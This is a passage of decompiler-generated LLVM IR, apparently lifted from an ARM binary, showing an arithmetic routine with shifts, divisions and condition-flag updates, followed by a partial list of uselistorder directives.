  %v3_1f4c0 = udiv i32 %v5_1f51017, 4
  %v3_1f4c4 = zext i1 %v2_1f4c0 to i32
  %v6_1f4c4 = and i64 %v14_1f4a8, 4294967295
  %v7_1f4c4 = sub i32 33, %v15_1f4a8
  %v8_1f4c4 = zext i32 %v7_1f4c4 to i64
  %v9_1f4c4 = shl i64 %v6_1f4c4, %v8_1f4c4
  %v10_1f4c4 = sub i32 32, %v15_1f4a8
  %v11_1f4c4 = shl i32 %v3_1f4c4, %v10_1f4c4
  %v12_1f4c4 = zext i32 %v11_1f4c4 to i64
  %v14_1f4c4 = or i64 %v12_1f4c4, %v9_1f4c4
  %v15_1f4c4 = trunc i64 %v14_1f4c4 to i32
  %v3_1f4c8 = icmp uge i32 %v1_1f4d0, %v15_1f4c4
  %v3_1f4cc = icmp eq i1 %v3_1f4c8, false
  %v4_1f4cc = sub i32 %v0_1f4cc, %v3_1f4c0
  %v6_1f4cc = sext i1 %v3_1f4cc to i32
  %v7_1f4cc = add i32 %v6_1f4cc, %v4_1f4cc
  %v13_1f4cc = icmp ult i32 %v0_1f4cc, %v3_1f4c0
  %v14_1f4cc = or i1 %v13_1f4cc, %v3_1f4cc
  br i1 %v14_1f4cc, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1f4d0 = sub i32 %v1_1f4d0, %v15_1f4c4
  store i32 %v3_1f4d0, i32* %r6.global-to-local, align 4
  store i32 %v7_1f4cc, i32* %r5.global-to-local, align 4
  %v5_1f4d8 = udiv i32 %v0_1f518, 4
  %v6_1f4d8 = or i32 %v1_1f4d8, %v5_1f4d8
  store i32 %v6_1f4d8, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_1f4f4 = phi i32 [ %v1_1f4f457, %.thread6 ], [ %v6_1f4d8, %bb98 ]
  %v1_1f4a033 = phi i32 [ %v1_1f4a034, %.thread6 ], [ %v6_1f4d8, %bb98 ]
  %v1_1f4bc44 = phi i32 [ %v1_1f4bc45, %.thread6 ], [ %v6_1f4d8, %bb98 ]
  %v1_1f4d853 = phi i32 [ %v1_1f4d8, %.thread6 ], [ %v6_1f4d8, %bb98 ]
  %v0_1f4e8 = phi i32 [ %v0_1f4cc, %.thread6 ], [ %v7_1f4cc, %bb98 ]
  %v1_1f4ec = phi i32 [ %v1_1f4d0, %.thread6 ], [ %v3_1f4d0, %bb98 ]
  %v1_1f4dc = urem i32 %v3_1f4c0, 2
  %v2_1f4dc = icmp ne i32 %v1_1f4dc, 0
  %v3_1f4dc = udiv i32 %v5_1f51017, 8
  %v3_1f4e0 = zext i1 %v2_1f4dc to i32
  %v6_1f4e0 = and i64 %v14_1f4c4, 4294967295
  %v7_1f4e0 = sub i32 33, %v15_1f4c4
  %v8_1f4e0 = zext i32 %v7_1f4e0 to i64
  %v9_1f4e0 = shl i64 %v6_1f4e0, %v8_1f4e0
  %v10_1f4e0 = sub i32 32, %v15_1f4c4
  %v11_1f4e0 = shl i32 %v3_1f4e0, %v10_1f4e0
  %v12_1f4e0 = zext i32 %v11_1f4e0 to i64
  %v14_1f4e0 = or i64 %v12_1f4e0, %v9_1f4e0
  %v15_1f4e0 = trunc i64 %v14_1f4e0 to i32
  %v3_1f4e4 = icmp uge i32 %v1_1f4ec, %v15_1f4e0
  %v3_1f4e8 = icmp eq i1 %v3_1f4e4, false
  %v4_1f4e8 = sub i32 %v0_1f4e8, %v3_1f4dc
  %v6_1f4e8 = sext i1 %v3_1f4e8 to i32
  %v7_1f4e8 = add i32 %v6_1f4e8, %v4_1f4e8
  %v13_1f4e8 = icmp ult i32 %v0_1f4e8, %v3_1f4dc
  %v14_1f4e8 = or i1 %v13_1f4e8, %v3_1f4e8
  br i1 %v14_1f4e8, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_1f4ec = sub i32 %v1_1f4ec, %v15_1f4e0
  store i32 %v3_1f4ec, i32* %r6.global-to-local, align 4
  store i32 %v7_1f4e8, i32* %r5.global-to-local, align 4
  %v5_1f4f4 = udiv i32 %v0_1f518, 8
  %v6_1f4f4 = or i32 %v1_1f4f4, %v5_1f4f4
  store i32 %v6_1f4f4, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1f504 = phi i32 [ %v1_1f4ec, %.thread8 ], [ %v3_1f4ec, %bb100 ]
  %v0_1f500 = phi i32 [ %v0_1f4e8, %.thread8 ], [ %v7_1f4e8, %bb100 ]
  %v2_1f53c = phi i32 [ %v1_1f4f4, %.thread8 ], [ %v6_1f4f4, %bb100 ]
  %v1_1f4a032 = phi i32 [ %v1_1f4a033, %.thread8 ], [ %v6_1f4f4, %bb100 ]
  %v1_1f4bc43 = phi i32 [ %v1_1f4bc44, %.thread8 ], [ %v6_1f4f4, %bb100 ]
  %v1_1f4d852 = phi i32 [ %v1_1f4d853, %.thread8 ], [ %v6_1f4f4, %bb100 ]
  %v2_1f4f8 = or i32 %v0_1f500, %v1_1f504
  %v4_1f4f8 = icmp eq i32 %v2_1f4f8, 0
  br i1 %v4_1f4f8, label %dec_label_pc_1f538, label %dec_label_pc_1f500

dec_label_pc_1f500:                               ; preds = %.thread10
  %v3_1f500 = mul i32 %v0_1f500, 16
  %v4_1f504 = udiv i32 %v1_1f504, 268435456
  %v5_1f504 = or i32 %v3_1f500, %v4_1f504
  store i32 %v5_1f504, i32* %r5.global-to-local, align 4
  %v3_1f508 = mul i32 %v1_1f504, 16
  store i32 %v3_1f508, i32* %r6.global-to-local, align 4
  %v3_1f50c = mul nuw i32 %v3_1f4dc, 8
  %v4_1f510 = udiv i32 %v15_1f4e0, 536870912
  %v5_1f510 = or i32 %v4_1f510, %v3_1f50c
  %v3_1f514 = mul i32 %v15_1f4e0, 8
  %v3_1f518 = udiv i32 %v0_1f518, 16
  store i32 %v3_1f518, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1f518, 16
  br i1 %tmp, label %dec_label_pc_1f520, label %dec_label_pc_1f490

dec_label_pc_1f520:                               ; preds = %dec_label_pc_1f500
  %v1_1f520 = and i32 %v1_1f53c.ph, 1048576
  %v2_1f520 = icmp eq i32 %v1_1f520, 0
  br i1 %v2_1f520, label %dec_label_pc_1f528, label %.thread11.loopexit

dec_label_pc_1f528:                               ; preds = %dec_label_pc_1f520
  %v2_1f528 = or i32 %v2_1f53c, %v1_1f53c.ph
  store i32 %v2_1f528, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1f490.outer

dec_label_pc_1f538:                               ; preds = %.thread10
  store i32 %v15_1f4e0, i32* %r2.global-to-local, align 4
  store i32 %v3_1f4dc, i32* %r3.global-to-local, align 4
  %v1_1f538 = and i32 %v1_1f53c.ph, 1048576
  %v2_1f538 = icmp eq i32 %v1_1f538, 0
  br i1 %v2_1f538, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_1f538
  %v3_1f53c = or i32 %v2_1f53c, %v1_1f53c.ph
  store i32 %v3_1f53c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1f520
  store i32 %v3_1f514, i32* %r2.global-to-local, align 4
  store i32 %v5_1f510, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1f538, %bb101
  %v1_1f544 = add nsw i32 %v4_1f464, 515
  store i32 %v1_1f544, i32* %ip.global-to-local, align 4
  %v2_1f544 = icmp ugt i32 %v1_1f468, 252
  %v7_1f544 = icmp eq i32 %v1_1f468, 253
  %v2_1f548 = xor i1 %v7_1f544, true
  %v3_1f548 = and i1 %v2_1f544, %v2_1f548
  br i1 %v3_1f548, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_1f548 = icmp ugt i32 %v1_1f544, 1791
  %v11_1f548 = icmp eq i32 %v1_1f544, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_1f54c = phi i1 [ %v7_1f544, %.thread11 ], [ %v11_1f548, %bb102 ]
  %v0_1f54c = phi i1 [ %v2_1f544, %.thread11 ], [ %v6_1f548, %bb102 ]
  %v2_1f54c = xor i1 %v1_1f54c, true
  %v3_1f54c = and i1 %v0_1f54c, %v2_1f54c
  call void @__pseudo_cond_branch(i1 %v3_1f54c, i32 ptrtoint (i32* @global_var_1f260.1725 to i32))
  %v0_1f550 = load i32, i32* %r5.global-to-local, align 4
  %v1_1f550 = load i32, i32* %r3.global-to-local, align 4
  %v2_1f550 = sub i32 %v0_1f550, %v1_1f550
  store i32 %v2_1f550, i32* %ip.global-to-local, align 4
  %v3_1f550 = icmp uge i32 %v0_1f550, %v1_1f550
  %v9_1f550 = icmp eq i32 %v0_1f550, %v1_1f550
  br i1 %v9_1f550, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_1f554 = load i32, i32* %r6.global-to-local, align 4
  %v2_1f554 = load i32, i32* %r2.global-to-local, align 4
  %v3_1f554 = sub i32 %v1_1f554, %v2_1f554
  store i32 %v3_1f554, i32* %ip.global-to-local, align 4
  %v4_1f554 = icmp uge i32 %v1_1f554, %v2_1f554
  %v10_1f554 = icmp eq i32 %v1_1f554, %v2_1f554
  br i1 %v10_1f554, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_1f558 = load i32, i32* %r0.global-to-local, align 4
  %v2_1f558 = urem i32 %v1_1f558, 2
  %v3_1f558 = icmp ne i32 %v2_1f558, 0
  %v4_1f558 = udiv i32 %v1_1f558, 2
  store i32 %v4_1f558, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_1f55c = phi i1 [ %v3_1f550, %bb103 ], [ %v4_1f554, %bb104 ], [ %v3_1f558, %bb105 ]
  %v0_1f55c = load i32, i32* %r0.global-to-local, align 4
  %v2_1f55c = zext i1 %v1_1f55c to i32
  %v3_1f55c = add i32 %v2_1f55c, %v0_1f55c
  store i32 %v3_1f55c, i32* %r0.global-to-local, align 4
  %v0_1f560 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f560 = load i32, i32* %r4.global-to-local, align 4
  %v2_1f560 = and i32 %v1_1f560, 4096
  %v3_1f560 = icmp ne i32 %v2_1f560, 0
  %v4_1f560 = mul i32 %v1_1f560, 1048576
  %v6_1f560 = add i32 %v4_1f560, %v0_1f560
  %v7_1f560 = zext i1 %v3_1f560 to i32
  %v8_1f560 = add i32 %v7_1f560, %v6_1f560
  store i32 %v8_1f560, i32* %r1.global-to-local, align 4
  %v2_1f564 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1f564, i32* %r4.global-to-local, align 4
  store i32 %v6_1f404, i32* %r5.global-to-local, align 4
  store i32 %v9_1f404, i32* %r6.global-to-local, align 4
  ret i32 %v3_1f55c

dec_label_pc_1f56c:                               ; preds = %dec_label_pc_1f424
  %v1_1f56c = and i32 %v2_1f428, -2147483648
  %v4_1f570 = urem i32 %v1_1f410, 1048576
  %v5_1f570 = or i32 %v1_1f56c, %v4_1f570
  store i32 %v5_1f570, i32* %r1.global-to-local, align 4
  %v6_1f574 = add nsw i32 %v2_1f424, 1023
  store i32 %v6_1f574, i32* %r4.global-to-local, align 4
  %v8_1f574 = sub nsw i32 0, %v2_1f424
  %v9_1f574 = and i32 %v6_1f574, %v8_1f574
  %v11_1f574 = icmp slt i32 %v2_1f424, -1023
  %v12_1f574 = icmp eq i32 %v6_1f574, 0
  %v7_1f578 = icmp sgt i32 %v2_1f424, -1023
  br i1 %v7_1f578, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_1f56c
  %v10_1f578 = sub nsw i32 1024, %v2_1f424
  store i32 %v10_1f578, i32* %r5.global-to-local, align 4
  %v14_1f578 = and i32 %v10_1f578, %v6_1f574
  %v16_1f578 = icmp slt i32 %v10_1f578, 0
  %v17_1f578 = icmp eq i32 %v6_1f574, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_1f56c, %bb106
  %v3_1f584.in = phi i32 [ %v9_1f574, %dec_label_pc_1f56c ], [ %v14_1f578, %bb106 ]
  %v2_1f584 = phi i1 [ %v11_1f574, %dec_label_pc_1f56c ], [ %v16_1f578, %bb106 ]
  %v1_1f584 = phi i1 [ %v12_1f574, %dec_label_pc_1f56c ], [ %v17_1f578, %bb106 ]
  %v3_1f584 = icmp slt i32 %v3_1f584.in, 0
  %v3_1f57c = xor i1 %v3_1f584, %v2_1f584
  %v4_1f57c = or i1 %v1_1f584, %v3_1f57c
  br i1 %v4_1f57c, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1f57c84 = mul i32 %v6_1f574, 1048576
  %v10_1f57c85 = or i32 %v9_1f57c84, %v5_1f570
  store i32 %v10_1f57c85, i32* %r1.global-to-local, align 4
  store i32 %v3_1f404, i32* %r4.global-to-local, align 4
  store i32 %v6_1f404, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1f584 = phi i32 [ %v12_1f404, %bb108 ], [ %v1_1f56c, %bb107 ]
  %v6_1f584 = xor i1 %v4_1f57c, true
  call void @__pseudo_cond_branch(i1 %v6_1f584, i32 %v0_1f584)
  %v0_1f588 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f588 = or i32 %v0_1f588, 1048576
  store i32 %v1_1f588, i32* @r1, align 4
  %v0_1f590 = load i32, i32* %r4.global-to-local, align 4
  %v1_1f590 = add i32 %v0_1f590, -1
  store i32 %v1_1f590, i32* @r4, align 4
  %v3_1f590 = sub i32 0, %v0_1f590
  %v4_1f590 = and i32 %v0_1f590, %v3_1f590
  %v5_1f590 = icmp slt i32 %v4_1f590, 0
  store i1 %v5_1f590, i1* @cpsr_v, align 1
  %v6_1f590 = icmp slt i32 %v1_1f590, 0
  store i1 %v6_1f590, i1* @cpsr_n, align 1
  %v7_1f590 = icmp eq i32 %v0_1f590, 1
  store i1 %v7_1f590, i1* @cpsr_z, align 1
  %v0_1f594 = call i32 @function_1f260()
  store i32 %v0_1f594, i32* @r0, align 4
  %v0_1f59c = call i32 @function_1f260()
  store i32 %v0_1f59c, i32* @r0, align 4
  %v0_1f5a0.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1f5a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1f5a0

dec_label_pc_1f5a0:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1f5a0.pre-phi = phi i32 [ %v5_1f414, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_1f414, %bb91 ], [ %v5_1f414, %.thread ]
  %v0_1f5a4 = phi i32 [ %v5_1f410, %.thread1 ], [ %v5_1f410, %.thread2 ], [ %v5_1f410, %bb91 ], [ %v0_1f5a4.pre, %.thread ]
  %v2_1f5a8 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1f5a0.pre, %.thread ]
  %v5_1f5a0 = and i32 %v2_1f5a8, %v4_1f5a0.pre-phi
  store i32 %v5_1f5a0, i32* @r5, align 4
  %v4_1f5a4 = icmp eq i32 %v2_1f5a8, %v0_1f5a4
  br i1 %v4_1f5a4, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1f5a0
  %v5_1f5a8 = icmp eq i32 %v5_1f5a0, %v2_1f5a8
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1f5a0, %bb109
  %v0_1f5ac = phi i1 [ false, %dec_label_pc_1f5a0 ], [ %v5_1f5a8, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_1f5ac, i32 ptrtoint (i32* @global_var_1f3f4.1727 to i32))
  %v0_1f5b0 = load i32, i32* @r4, align 4
  %v1_1f5b0 = load i32, i32* %ip.global-to-local, align 4
  %v4_1f5b0 = icmp eq i32 %v1_1f5b0, %v0_1f5b0
  br i1 %v4_1f5b0, label %dec_label_pc_1f5b8, label %dec_label_pc_1f5d4

dec_label_pc_1f5b8:                               ; preds = %bb110
  %v0_1f5b8 = load i32, i32* @r0, align 4
  %v1_1f5b8 = load i32, i32* @r1, align 4
  %v4_1f5b8 = mul i32 %v1_1f5b8, 4096
  %v5_1f5b8 = or i32 %v4_1f5b8, %v0_1f5b8
  store i32 %v5_1f5b8, i32* %r4.global-to-local, align 4
  %v1_1f5bc = icmp ne i32 %v5_1f5b8, 0
  call void @__pseudo_cond_branch(i1 %v1_1f5bc, i32 ptrtoint (i32* @global_var_1f3f4.1727 to i32))
  %v0_1f5c0 = load i32, i32* @r5, align 4
  %v1_1f5c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_1f5c4 = icmp ne i32 %v1_1f5c0, %v0_1f5c0
  call void @__pseudo_cond_branch(i1 %v1_1f5c4, i32 ptrtoint (i32* @global_var_1f3d8.1728 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1f5d0 = call i32 @function_1f3f4(i32 %arg3, i32 %arg4)
  store i32 %v2_1f5d0, i32* @r0, align 4
  %v1_1f5d4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1f5d4

dec_label_pc_1f5d4:                               ; preds = %bb110, %dec_label_pc_1f5b8
  %v1_1f5d4 = phi i32 [ %v1_1f5b0, %bb110 ], [ %v1_1f5d4.pre, %dec_label_pc_1f5b8 ]
  %v0_1f5d4 = load i32, i32* @r5, align 4
  %v4_1f5d4 = icmp eq i32 %v0_1f5d4, %v1_1f5d4
  br i1 %v4_1f5d4, label %dec_label_pc_1f5dc, label %dec_label_pc_1f5d4.dec_label_pc_1f5f0_crit_edge

dec_label_pc_1f5d4.dec_label_pc_1f5f0_crit_edge:  ; preds = %dec_label_pc_1f5d4
  %v0_1f5f0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1f5f0

dec_label_pc_1f5dc:                               ; preds = %dec_label_pc_1f5d4
  %v4_1f5dc = mul i32 %arg4, 4096
  %v5_1f5dc = or i32 %v4_1f5dc, %arg3
  store i32 %v5_1f5dc, i32* %r5.global-to-local, align 4
  %v7_1f5dc = icmp eq i32 %v5_1f5dc, 0
  call void @__pseudo_cond_branch(i1 %v7_1f5dc, i32 ptrtoint (i32* @global_var_1f388.1729 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1f5ec = call i32 @function_1f3f4(i32 %arg3, i32 %arg4)
  store i32 %v2_1f5ec, i32* @r0, align 4
  br label %dec_label_pc_1f5f0

dec_label_pc_1f5f0:                               ; preds = %dec_label_pc_1f5d4.dec_label_pc_1f5f0_crit_edge, %dec_label_pc_1f5dc
  %v0_1f5f0 = phi i32 [ %v0_1f5f0.pre, %dec_label_pc_1f5d4.dec_label_pc_1f5f0_crit_edge ], [ %v2_1f5ec, %dec_label_pc_1f5dc ]
  %v1_1f5f0 = load i32, i32* @r1, align 4
  %v3_1f5f0 = mul i32 %v1_1f5f0, 2
  %v4_1f5f0 = or i32 %v3_1f5f0, %v0_1f5f0
  store i32 %v4_1f5f0, i32* %r6.global-to-local, align 4
  %v6_1f5f0 = icmp eq i32 %v4_1f5f0, 0
  br i1 %v6_1f5f0, label %dec_label_pc_1f5f0._crit_edge, label %bb111

dec_label_pc_1f5f0._crit_edge:                    ; preds = %dec_label_pc_1f5f0
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1f5f0
  %v4_1f5f4 = mul i32 %arg4, 2
  %v5_1f5f4 = or i32 %v4_1f5f4, %arg3
  store i32 %v5_1f5f4, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1f5f4, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1f5f0._crit_edge, %bb111
  %v4_1f604.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1f5f0._crit_edge ], [ %v5_1f5f4, %bb111 ]
  %v0_1f5f8 = phi i1 [ false, %dec_label_pc_1f5f0._crit_edge ], [ %phitmp, %bb111 ]
  call void @__pseudo_cond_branch(i1 %v0_1f5f8, i32 ptrtoint (i32* @global_var_1f320.1730 to i32))
  %v0_1f5fc = load i32, i32* @r0, align 4
  %v1_1f5fc = load i32, i32* @r1, align 4
  %v3_1f5fc = mul i32 %v1_1f5fc, 2
  %v4_1f5fc = or i32 %v3_1f5fc, %v0_1f5fc
  store i32 %v4_1f5fc, i32* %r4.global-to-local, align 4
  %v1_1f600 = icmp ne i32 %v4_1f5fc, 0
  call void @__pseudo_cond_branch(i1 %v1_1f600, i32 ptrtoint (i32* @global_var_1f3d8.1728 to i32))
  store i32 %v4_1f604.pre-phi, i32* %r5.global-to-local, align 4
  %v1_1f608 = icmp ne i32 %v4_1f604.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_1f608, i32 ptrtoint (i32* @global_var_1f388.1729 to i32))
  %v0_1f60c = load i32, i32* @r0, align 4
  %v1_1f60c = load i32, i32* @r1, align 4
  %v2_1f60c = call i32 @function_1f3f4(i32 %v0_1f60c, i32 %v1_1f60c)
  store i32 %v2_1f60c, i32* %r0.global-to-local, align 4
  ret i32 %v2_1f60c

; uselistorder directives
  uselistorder i32 %v5_1f5f4, { 1, 0, 2 }
  uselistorder i32 %v1_1f5b0, { 1, 0 }
  uselistorder i32 %v1_1f590, { 1, 0 }
  uselistorder i32 %v0_1f590, { 3, 1, 0, 2 }
  uselistorder i32 %v10_1f578, { 2, 0, 1 }
  uselistorder i32 %v6_1f574, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1f56c, { 1, 0 }
  uselistorder i32 %v2_1f554, { 1, 0, 2 }
  uselistorder i32 %v1_1f554, { 1, 0, 2 }
  uselistorder i32 %v1_1f550, { 1, 0, 2 }
  uselistorder i32 %v0_1f550, { 1, 0, 2 }
  uselistorder i1 %v7_1f544, { 1, 0 }
  uselistorder i32 %v2_1f528, { 1, 0 }
  uselistorder i32 %v3_1f514, { 2, 1, 0 }
  uselistorder i32 %v3_1f508, { 0, 2, 1 }
  uselistorder i32 %v5_1f504, { 2, 0, 1 }
  uselistorder i32 %v6_1f4f4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1f4e0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1f4dc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1f4e8, { 0, 2, 1 }
  uselistorder i32 %v1_1f4f4, { 1, 0 }
  uselistorder i32 %v6_1f4d8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1f4c4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1f4c0, { 0, 2, 1 }
  uselistorder i32 %v0_1f4cc, { 0, 2, 1 }
  uselistorder i32 %v1_1f4d8, { 1, 0 }
  uselistorder i32 %v6_1f4bc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_1f4a8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1f4b0, { 0, 2, 1 }
  uselistorder i32 %v1_1f4bc, { 1, 0 }
  uselistorder i32 %v3_1f4a0, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_1f494, { 1, 2, 0 }
  uselistorder i32 %v3_1f51413, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1f51017, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_1f494, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1f4a0, { 1, 0 }
  uselistorder i32 %storemerge133, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1f53c.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1f480, { 1, 0 }
  uselistorder i32 %v0_1f484, { 1, 0 }
  uselistorder i32 %v3_1f470, { 1, 0 }
  uselistorder i1 %v1_1f464, { 1, 0 }
  uselistorder i32 %v3_1f454, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1f450, { 3, 2, 1, 0 }
  uselistorder i32 %v3_1f448, { 2, 1, 0 }
  uselistorder i32 %v5_1f444, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1f424, { 3, 1, 2, 0, 4, 7, 6, 5, 8 }
  uselistorder i32 %v6_1f414, { 2, 3, 1, 0 }
  uselistorder i32 %v5_1f414, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_1f410, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_1f410, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_1f404, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 4, 5, 6, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0, 4, 5, 8, 6, 7, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 9, 1, 6, 7, 2, 3, 4, 5, 8, 0 }
  uselistorder i32* %ip.global-to-local, { 6, 7, 8, 9, 1, 2, 3, 4, 5, 0, 10 }
  uselistorder i32 (i32, i32)* @function_1f3f4, { 2, 1, 0 }
  uselistorder i32 ()* @function_1f260, { 1, 0 }
  uselistorder i32 1024, { 3, 0, 22, 19, 20, 21, 1, 23, 4, 24, 2, 5, 14, 15, 16, 6, 7, 17, 8, 18, 9, 12, 11, 10, 13 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 1, 7, 5, 6, 8, 9, 24, 10, 11, 2, 12, 13, 28, 88, 89, 96, 98, 14, 99, 15, 102, 103, 39, 104, 106, 120, 121, 122, 123, 16, 124, 125, 111, 112, 126, 127, 64, 65, 66, 67, 100, 101, 60, 61, 62, 63, 107, 108, 109, 110, 97, 3, 128, 129, 130, 131, 32, 33, 34, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 116, 117, 113, 114, 115, 90, 91, 132, 133, 134, 135, 136, 137, 138, 139, 143, 144, 145, 118, 17, 140, 35, 146, 92, 93, 40, 41, 94, 95, 68, 69, 70, 29, 105, 36, 71, 86, 72, 153, 154, 0, 155, 156, 119, 26, 147, 148, 149, 150, 151, 56, 141, 142, 73, 18, 25, 19, 20, 4, 21, 22, 30, 42, 43, 74, 75, 76, 77, 78, 44, 79, 45, 80, 46, 81, 47, 48, 37, 49, 82, 50, 51, 83, 38, 57, 58, 52, 59, 84, 27, 31, 85, 87, 53, 152, 23, 54, 55 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 84, 85, 37, 6, 7, 24, 8, 132, 133, 140, 142, 143, 144, 145, 9, 146, 148, 149, 150, 151, 152, 38, 94, 69, 70, 86, 161, 162, 163, 164, 33, 174, 95, 96, 97, 98, 147, 153, 154, 155, 156, 157, 158, 159, 160, 141, 175, 176, 210, 259, 61, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 165, 166, 167, 168, 177, 178, 179, 180, 181, 182, 183, 184, 185, 10, 62, 186, 46, 187, 188, 87, 189, 190, 169, 35, 170, 171, 173, 191, 192, 193, 134, 135, 136, 137, 138, 139, 99, 100, 101, 102, 71, 277, 278, 39, 103, 11, 126, 129, 104, 105, 36, 211, 212, 213, 214, 215, 216, 217, 218, 12, 74, 219, 220, 221, 222, 223, 224, 225, 226, 13, 227, 228, 229, 230, 14, 231, 232, 15, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 250, 243, 244, 245, 246, 75, 26, 247, 248, 249, 76, 77, 16, 251, 252, 253, 254, 256, 257, 78, 17, 258, 18, 255, 172, 65, 66, 63, 64, 27, 28, 43, 44, 67, 279, 196, 197, 88, 198, 199, 200, 34, 79, 80, 201, 202, 203, 68, 204, 205, 206, 29, 30, 207, 208, 209, 81, 194, 195, 106, 72, 89, 40, 19, 20, 25, 21, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 82, 31, 22, 117, 83, 32, 23, 118, 119, 120, 73, 121, 122, 123, 124, 125, 42, 60, 58, 59, 41, 57, 55, 56, 54, 52, 53, 51, 50, 48, 49, 90, 91, 92, 93, 47, 45, 127, 128, 130, 131 }
  uselistorder i32 4, { 5, 6, 205, 258, 259, 206, 7, 8, 260, 261, 262, 263, 264, 66, 265, 266, 274, 276, 277, 105, 278, 279, 280, 83, 281, 284, 138, 285, 286, 287, 288, 289, 290, 9, 291, 139, 106, 292, 140, 0, 1, 141, 295, 316, 317, 108, 107, 318, 142, 143, 144, 145, 319, 320, 110, 321, 109, 322, 85, 323, 324, 325, 308, 309, 218, 219, 282, 283, 213, 214, 215, 216, 217, 296, 297, 298, 299, 300, 301, 302, 303, 304, 10, 305, 306, 307, 275, 11, 326, 12, 327, 363, 267, 13, 14, 15, 244, 16, 17, 328, 18, 104, 99, 100, 19, 422, 101, 423, 88, 20, 21, 102, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 22, 441, 442, 443, 444, 445, 446, 87, 447, 448, 449, 450, 451, 452, 23, 24, 103, 453, 310, 111, 329, 330, 331, 332, 333, 334, 335, 336, 337, 84, 338, 339, 340, 341, 343, 312, 25, 313, 112, 314, 315, 342, 293, 294, 344, 146, 268, 269, 270, 271, 272, 273, 26, 220, 221, 222, 223, 27, 224, 454, 147, 113, 148, 455, 28, 456, 149, 211, 212, 366, 367, 368, 94, 369, 150, 29, 225, 151, 226, 152, 91, 227, 